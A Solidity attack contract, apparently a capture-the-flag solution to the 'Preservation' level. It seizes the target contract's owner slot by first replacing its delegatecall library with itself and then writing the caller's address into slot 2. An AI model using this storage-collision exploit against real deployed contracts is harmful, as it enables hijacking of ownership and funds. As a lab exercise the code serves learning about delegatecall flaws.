// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "./Preservation.sol";

contract PreservationAttack {
    uint256 public slot0;
    uint256 public slot1;
    address public slot2;
    uint256 public slot3;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address addr) external {
        if (msg.sender != owner) revert();

        Preservation(addr).setFirstTime(uint160(address(this)));

        Preservation(addr).setFirstTime(uint160(msg.sender));
    }

    function setTime(uint256 addressAsNumber) external {
        slot2 = address(uint160(addressAsNumber));
    }
}
